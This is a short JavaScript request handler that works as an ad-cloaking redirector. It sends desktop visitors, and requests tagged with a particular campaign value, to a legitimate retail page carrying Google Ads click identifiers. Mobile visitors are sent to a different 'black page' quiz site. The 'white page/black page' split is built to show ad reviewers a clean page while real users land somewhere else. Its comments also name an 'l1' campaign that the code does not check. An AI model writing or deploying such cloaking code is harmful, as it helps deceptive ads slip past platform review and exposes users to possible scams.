export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://www.beyaly.com/?gad_source=1&gad_campaignid=22309687434&gbraid=0AAAAApylhvS0xPDiFIkMa7fR7dqBIdkj4&gclid=CjwKCAjwjffHBhBuEiwAKMb8pCHX0fR-n6PZLucJXSdRuHqPQgD3BPqfCx6bKiXDKuH1kq3OPnyIlxoC7CcQAvD_BwE";
    const blackPageURL = "https://instentquzzz.lovable.app/";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();

  }


